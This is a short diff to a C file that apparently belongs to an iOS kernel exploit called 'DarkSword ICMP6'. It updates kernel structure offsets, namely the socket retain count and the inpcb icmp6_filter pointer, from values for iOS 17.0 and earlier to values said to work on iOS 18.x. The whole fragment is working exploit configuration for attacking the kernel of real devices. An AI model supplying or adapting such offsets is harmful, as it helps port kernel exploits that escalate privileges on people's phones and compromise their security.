@@ -16,11 +16,12 @@
 #define PAGE_SIZE 0x4000ULL
 
 // ===== DarkSword ICMP6 exploit offsets =====
-// Values match the canonical darkSword-kexploit (opa334/saudgl ports),
-// verified working across iOS 15.x -> 26.x.
+// wh1te4ever / ClearSword (TheRealClarity) verified offsets for iOS 18.x:
+//   inpcb_icmp6filt = 0x148, socket_so_count = 0x254 (iOS 18.0+)
+// (the 0x138+0x18=0x150 / 0x228 values are for iOS <= 17.0)
 #define OFFSET_PCB_SOCKET      0x40   // inpcb -> socket
-#define OFFSET_SOCKET_SO_COUNT 0x228  // socket retain count
-#define OFFSET_ICMP6FILT       (0x138 + 0x18)  // inpcb icmp6_filter pointer
+#define OFFSET_SOCKET_SO_COUNT 0x254  // socket retain count (iOS 18.x)
+#define OFFSET_ICMP6FILT       0x148  // inpcb icmp6_filter pointer (iOS 18.x)
 #define OFFSET_SO_PROTO        0x18   // socket -> protosw
 #define OFFSET_PR_INPUT        0x28   // protosw -> pr_input
 
